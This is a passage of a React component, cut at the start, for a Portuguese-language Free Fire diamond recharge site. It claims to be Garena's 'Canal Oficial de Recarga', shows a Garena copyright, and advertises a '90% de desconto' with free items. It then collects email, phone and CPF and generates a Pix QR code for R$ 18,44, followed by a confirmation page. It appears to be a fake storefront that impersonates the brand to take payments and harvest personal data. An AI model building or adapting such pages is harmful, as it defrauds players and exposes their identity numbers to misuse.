                alt={`Banner ${i + 1}`}
                className={`rounded-xl shadow-2xl transition-all duration-500 ${
                  i === bannerIndex
                    ? "w-[75%] opacity-100"
                    : "w-[15%] opacity-50 scale-90"
                }`}
              />
            ))}
          </div>
          <div className="flex justify-center gap-2 mt-3">
            {[0, 1, 2, 3].map((i) => (
              <div
                key={i}
                className={`w-2 h-2 rounded-full ${
                  i === bannerIndex ? "bg-red-500" : "bg-white/40"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="px-4 py-4 space-y-4">
          <h3 className="font-bold text-[#1a1a1a] text-sm mb-3">
            Seleção de jogos
          </h3>
          <div className="flex gap-4">
            <div className="flex flex-col items-center cursor-pointer">
              <div className="w-16 h-16 rounded-2xl overflow-hidden border-2 border-red-500">
                <img
                  src="/images/ff-icon.png"
                  className="w-full h-full object-cover"
                  alt="Free Fire"
                />
              </div>
              <span className="text-xs font-bold text-red-500 mt-1">
                Free Fire
              </span>
            </div>
            <div className="flex flex-col items-center opacity-50">
              <div className="w-16 h-16 rounded-2xl overflow-hidden border-2 border-transparent">
                <img
                  src="/images/delta-force-icon.png"
                  className="w-full h-full object-cover"
                  alt="Delta Force"
                />
              </div>
              <span className="text-xs text-[#666] mt-1">Delta Force</span>
            </div>
          </div>

          <div className="bg-gradient-to-r from-[#2d1b69] to-[#1a1145] rounded-xl p-4 flex items-center gap-3">
            <img
              src="/images/ff-icon.png"
              alt="Free Fire"
              className="w-14 h-14 rounded-xl shadow-md"
            />
            <div>
              <h3 className="text-white font-bold text-lg">Free Fire</h3>
              <span className="text-white/80 text-xs border border-white/30 rounded-full px-2 py-0.5 flex items-center gap-1 w-fit">
                <Shield className="w-3 h-3" /> Pagamento 100% Seguro
              </span>
            </div>
          </div>

          <div className="border rounded-lg p-4 flex items-center justify-between bg-white">
            <div>
              <h4 className="font-bold text-[#1a1a1a]">Item Grátis</h4>
              <p className="text-sm text-[#666]">
                Resgate aqui seus itens exclusivos grátis
              </p>
              <button className="bg-[#ef4444] text-white font-bold text-sm px-4 py-1.5 rounded-lg mt-2">
                Resgatar
              </button>
            </div>
            <div className="text-right">
              <img
                src="/images/pacote-armas.png"
                alt="Pacote"
                className="w-16 h-16 object-contain"
              />
              <p className="text-xs text-[#666]">Pacote de Arm...</p>
            </div>
          </div>

          <div className="flex items-center gap-2 mb-4">
            <div className="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-xs font-bold">
              1
            </div>
            <h3 className="text-lg font-bold text-[#1a1a1a]">Login</h3>
          </div>
          <div className="bg-[#28a745] text-white font-bold px-4 py-2 rounded-lg w-fit">
            LOGADO!
          </div>

          <div className="flex items-center gap-2 mb-4 mt-6">
            <div className="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-xs font-bold">
              2
            </div>
            <h3 className="text-lg font-bold text-[#1a1a1a]">
              Valor de Recarga
            </h3>
          </div>

          <div className="relative max-w-[400px] border-2 border-[#dc3545] rounded-lg bg-[#fff5f5] p-4">
            <CircleCheckBig className="absolute top-3 right-3 w-6 h-6 text-[#ee2b2b]" />
            <p className="text-sm text-[#1a1a1a]/80">
              Você ganhou 90% de desconto!
            </p>
            <p className="font-bold text-lg flex items-center gap-2">
              💎 5.600
            </p>
            <p className="text-[#28a745] font-semibold text-[13px]">
              + Bônus 1.200 💎
            </p>
          </div>

          <div className="flex items-center justify-between mb-3 mt-6">
            <h3 className="font-bold text-[#1a1a1a] text-sm">
              Ofertas especiais
            </h3>
            <span className="text-[#dc3545] font-bold text-xs">
              OFERTAS COM DESCONTO!
            </span>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
            {offers.map((offer, i) => (
              <div
                key={i}
                onClick={() =>
                  setSelectedOffers((prev) =>
                    prev.includes(i)
                      ? prev.filter((x) => x !== i)
                      : [...prev, i]
                  )
                }
                className={`relative border rounded-lg p-3 cursor-pointer transition-all bg-white ${
                  selectedOffers.includes(i)
                    ? "border-[#dc3545] border-2"
                    : "border-[#e5e7eb] hover:border-[#dc3545]"
                }`}
              >
                <img
                  src={`/images/${offer.img}`}
                  alt={offer.name}
                  className="w-full h-24 object-contain mb-2"
                />
                <p className="text-xs font-medium text-[#1a1a1a]">
                  {offer.name}
                </p>
                <div className="flex items-center gap-1 mt-1">
                  <span className="text-xs text-[#666] line-through">
                    {offer.oldPrice}
                  </span>
                  <span className="text-xs font-bold text-[#dc3545]">
                    {offer.newPrice}
                  </span>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 mb-4 mt-6">
            <div className="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-xs font-bold">
              3
            </div>
            <h3 className="text-lg font-bold text-[#1a1a1a]">
              Método de pagamento
            </h3>
          </div>

          <p className="text-sm text-[#1a1a1a]/80 mb-2">
            Utilize sua instituição financeira para realizar o pagamento.
          </p>
          <p className="text-sm text-[#1a1a1a]/80 mb-2">
            Seus créditos caem na sua conta de jogo assim que recebermos a
            confirmação de pagamento.
          </p>
          <p className="text-sm text-[#1a1a1a]/80 mb-4">
            [Para FF] Além dos diamantes em bônus, você ganha + 20% de bônus em
            items dentro do jogo.
          </p>

          <div className="border-2 border-[#dc3545] rounded-lg p-4 flex items-center justify-between bg-white relative">
            <CircleCheckBig className="absolute top-2 right-2 w-5 h-5 text-[#28a745]" />
            <div className="flex items-center gap-3">
              <img src="/images/pay-pix.png" alt="Pix" className="h-8" />
              <div>
                <p className="font-bold text-[#1a1a1a]">R$ 18,44</p>
                <p className="text-xs text-[#28a745] font-semibold">
                  + Bônus 1.200 💎
                </p>
              </div>
            </div>
            <span className="bg-[#dc3545] text-white text-xs font-bold px-2 py-1 rounded flex items-center gap-1">
              🔥 PROMO
            </span>
          </div>
        </div>

        <div className="fixed bottom-0 left-0 right-0 bg-white border-t px-4 py-3 flex items-center justify-between z-50">
          <div>
            <p className="text-sm font-bold text-[#1a1a1a]">
              💎 5.600 + 1.200
            </p>
            <p className="text-xs text-[#666]">
              Total:{" "}
              <strong className="text-[#1a1a1a]">
                R${" "}
                {(
                  (1844 +
                    selectedOffers.reduce(
                      (sum, i) => sum + offers[i].price,
                      0
                    )) /
                  100
                )
                  .toFixed(2)
                  .replace(".", ",")}
              </strong>
            </p>
          </div>
          <button
            onClick={() => setPage("pagamento")}
            className="bg-[#dc3545] text-white font-bold px-6 py-3 rounded-lg text-[14px] flex items-center gap-2 hover:bg-[#c82333] transition"
          >
            Compre agora
          </button>
        </div>

        <footer className="bg-[#f8f9fa] border-t px-4 py-4 flex flex-col sm:flex-row justify-between items-center text-xs text-[#666] gap-2 mb-16">
          <span>© Garena Online. Todos os direitos reservados.</span>
          <div className="flex gap-4">
            <a href="#">FAQ</a>
            <a href="#">Termos e Condições</a>
            <a href="#">Política de Privacidade</a>
          </div>
        </footer>
      </div>
    );
  }

  // ============ PAGAMENTO PAGE ============
  if (page === "pagamento") {
    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col">
        <header className="bg-white px-4 py-3 flex items-center gap-3">
          <img
            src="/images/garena-logo-full.png"
            alt="Garena"
            className="h-8"
          />
          <span className="text-[#1a1a1a] font-medium text-sm">
            Canal Oficial de Recarga
          </span>
        </header>
        <button
          onClick={() => setPage("logado")}
          className="bg-[#1a1a1a] text-white text-sm font-medium px-3 py-1.5 rounded-lg m-4 w-fit"
        >
          &lt; Voltar
        </button>

        <div className="relative w-full h-48 overflow-hidden">
          <img
            src="/images/banner-fundo.jpg"
            alt="Free Fire"
            className="w-full h-full object-cover"
          />
          <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2">
            <div className="relative">
              <img
                src="/images/ff-icon.png"
                className="w-16 h-16 rounded-2xl shadow-lg border-2 border-white"
                alt="FF"
              />
              <span className="absolute -top-1 -left-1 bg-red-500 text-white text-[8px] font-bold px-1 rounded">
                HOT
              </span>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6 mx-4 mt-12">
          <div className="flex justify-between items-center mb-4">
            <span className="text-[#1a1a1a] font-medium">Total</span>
            <span className="font-bold text-[#1a1a1a] flex items-center gap-1">
              💎 6.720
            </span>
          </div>
          <div className="bg-[#f8f9fa] rounded-lg p-3">
            <div className="flex justify-between text-sm mb-1">
              <span className="text-[#1a1a1a]/80">Preço Original</span>
              <span className="flex items-center gap-1">💎 5.600</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-[#1a1a1a]/80">+ Bônus Geral</span>
              <span className="flex items-center gap-1">💎 1.120</span>
            </div>
          </div>
          <p className="text-xs text-[#666] mt-3">
            Os diamantes são válidos apenas para a região do Brasil e serão
            creditados diretamente na conta de jogo.
          </p>
          <div className="flex justify-between mt-4">
            <span className="text-[#1a1a1a] font-medium">Preço</span>
            <span className="font-bold text-[#1a1a1a]">R$ 18,44</span>
          </div>
          <div className="flex justify-between mt-2">
            <span className="text-[#1a1a1a] font-medium">
              Método de pagamento
            </span>
            <span className="font-bold text-[#1a1a1a]">Pix</span>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6 mx-4 mt-4 mb-8">
          <div className="mb-4">
            <label className="text-sm font-medium text-[#1a1a1a] block mb-1">
              E-mail
            </label>
            <input
              type="email"
              placeholder="E-mail"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                setFormErrors((prev) => ({ ...prev, email: "" }));
              }}
              className={`w-full border rounded-lg px-4 py-2.5 text-[13px] text-[#111] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#ef4444] transition bg-white ${formErrors.email ? "border-red-500" : "border-[#d1d5db]"}`}
            />
            {formErrors.email && (
              <p className="text-red-500 text-xs mt-1">{formErrors.email}</p>
            )}
          </div>
          <div className="mb-4">
            <label className="text-sm font-medium text-[#1a1a1a] block mb-1">
              Telefone
            </label>
            <input
              type="tel"
              placeholder="(00) 00000-0000"
              value={phone}
              onChange={(e) => {
                setPhone(formatPhone(e.target.value));
                setFormErrors((prev) => ({ ...prev, phone: "" }));
              }}
              className={`w-full border rounded-lg px-4 py-2.5 text-[13px] text-[#111] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#ef4444] transition bg-white ${formErrors.phone ? "border-red-500" : "border-[#d1d5db]"}`}
            />
            {formErrors.phone && (
              <p className="text-red-500 text-xs mt-1">{formErrors.phone}</p>
            )}
          </div>
          <div className="mb-4">
            <label className="text-sm font-medium text-[#1a1a1a] block mb-1">
              CPF
            </label>
            <input
              type="text"
              placeholder="000.000.000-00"
              value={cpf}
              onChange={(e) => {
                setCpf(formatCPF(e.target.value));
                setFormErrors((prev) => ({ ...prev, cpf: "" }));
              }}
              className={`w-full border rounded-lg px-4 py-2.5 text-[13px] text-[#111] placeholder:text-[#9ca3af] focus:outline-none focus:border-[#ef4444] transition bg-white ${formErrors.cpf ? "border-red-500" : "border-[#d1d5db]"}`}
            />
            {formErrors.cpf && (
              <p className="text-red-500 text-xs mt-1">{formErrors.cpf}</p>
            )}
          </div>
          {pixError && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
              <p className="text-red-600 text-sm">{pixError}</p>
            </div>
          )}
          <p className="text-xs text-[#666] mb-4">
            Ao clicar em &quot;Prosseguir para Pagamento&quot;, atesto que li e
            concordo com os termos de uso e com a política de privacidade.
          </p>
          <button
            onClick={handlePaymentSubmit}
            disabled={pixLoading}
            className="w-full bg-[#dc3545] text-white font-bold py-4 rounded-lg text-base hover:bg-[#c82333] transition disabled:opacity-60 flex items-center justify-center gap-2"
          >
            {pixLoading ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin" /> Gerando PIX...
              </>
            ) : (
              "Prosseguir para Pagamento"
            )}
          </button>
        </div>
      </div>
    );
  }

  // ============ PIX PAGE ============
  if (page === "pix" && pixData) {
    const pixMinutes = Math.floor(pixTimer / 60);
    const pixSeconds = pixTimer % 60;
    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col">
        <header className="bg-white px-4 py-3 flex items-center gap-3">
          <img
            src="/images/garena-logo-full.png"
            alt="Garena"
            className="h-8"
          />
          <span className="text-[#1a1a1a] font-medium text-sm">
            Canal Oficial de Recarga
          </span>
        </header>

        <div className="bg-white rounded-lg shadow-sm p-6 mx-4 mt-4">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 bg-[#fff3cd] text-[#856404] px-4 py-2 rounded-lg text-sm font-medium mb-4">
              <Clock className="w-4 h-4" />
              Expira em {pixMinutes.toString().padStart(2, "0")}:{pixSeconds.toString().padStart(2, "0")}
            </div>
            <h2 className="text-lg font-bold text-[#1a1a1a] mb-1">
              Pague com PIX
            </h2>
            <p className="text-sm text-[#666]">
              Escaneie o QR Code ou copie o código abaixo
            </p>
          </div>

          <div className="flex justify-center mb-6">
            {pixData.qr_code ? (
              <div className="bg-white p-3 rounded-lg border">
                <QRCodeSVG value={pixData.qr_code} size={220} />
              </div>
            ) : pixData.qr_code_base64 ? (
              <img
                src={`data:image/png;base64,${pixData.qr_code_base64}`}
                alt="QR Code PIX"
                className="w-56 h-56 rounded-lg border"
              />
            ) : (
              <div className="w-56 h-56 bg-gray-100 rounded-lg flex items-center justify-center">
                <Loader2 className="w-8 h-8 animate-spin text-gray-400" />
              </div>
            )}
          </div>

          <div className="bg-[#f8f9fa] rounded-lg p-3 mb-4">
            <p className="text-xs text-[#666] mb-2 font-medium">Código PIX copia e cola:</p>
            <div className="flex items-center gap-2">
              <input
                type="text"
                readOnly
                value={pixData.qr_code}
                className="flex-1 text-xs bg-white border rounded px-3 py-2 text-[#333] truncate"
              />
              <button
                onClick={() => {
                  navigator.clipboard.writeText(pixData.qr_code);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 2000);
                }}
                className="bg-[#dc3545] text-white text-xs font-bold px-4 py-2 rounded-lg whitespace-nowrap hover:bg-[#c82333] transition"
              >
                {copied ? "Copiado!" : "Copiar"}
              </button>
            </div>
          </div>

          <div className="flex justify-between items-center bg-[#f0fdf4] rounded-lg p-3 mb-6">
            <span className="text-sm text-[#166534] font-medium">Valor:</span>
            <span className="text-lg font-bold text-[#166534]">R$ 18,44</span>
          </div>

          <div className="border-t pt-4">
            <h3 className="text-sm font-bold text-[#1a1a1a] mb-3">
              Como pagar:
            </h3>
            <ol className="text-sm text-[#666] space-y-2">
              <li className="flex items-start gap-2">
                <span className="bg-[#dc3545] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold shrink-0">1</span>
                Abra o app do seu banco ou carteira digital
              </li>
              <li className="flex items-start gap-2">
                <span className="bg-[#dc3545] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold shrink-0">2</span>
                Escolha pagar via PIX com QR Code ou copia e cola
              </li>
              <li className="flex items-start gap-2">
                <span className="bg-[#dc3545] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold shrink-0">3</span>
                Escaneie o código ou cole o código copiado
              </li>
              <li className="flex items-start gap-2">
                <span className="bg-[#dc3545] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold shrink-0">4</span>
                Confirme o pagamento e aguarde a confirmação
              </li>
            </ol>
          </div>

          <div className="flex items-center gap-2 mt-6 justify-center">
            <Loader2 className="w-4 h-4 animate-spin text-[#dc3545]" />
            <span className="text-sm text-[#666]">Aguardando pagamento...</span>
          </div>
        </div>
      </div>
    );
  }

  // ============ SUCESSO PAGE ============
  if (page === "sucesso") {
    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col items-center justify-center px-4">
        <div className="bg-white rounded-2xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="w-20 h-20 bg-[#d4edda] rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-[#28a745]" />
          </div>
          <h1 className="text-2xl font-bold text-[#1a1a1a] mb-2">
            Pagamento Confirmado!
          </h1>
          <p className="text-[#666] mb-6">
            Seus diamantes serão creditados na sua conta em instantes.
            Obrigado pela compra!
          </p>
          <div className="bg-[#f0fdf4] rounded-lg p-4 mb-6">
            <p className="text-sm text-[#166534]">
              <strong>ID do jogador:</strong> {playerId}
            </p>
            <p className="text-sm text-[#166534] mt-1">
              <strong>Valor pago:</strong> R$ 18,44
            </p>
          </div>
          <button
            onClick={() => {
              setPage("security");
              setPixData(null);
              setEmail("");
              setPhone("");
              setCpf("");
              setPlayerId("");
            }}
            className="w-full bg-[#dc3545] text-white font-bold py-3 rounded-lg hover:bg-[#c82333] transition"
          >
            Voltar ao Início
          </button>
        </div>
      </div>
    );
  }

  return null;
}
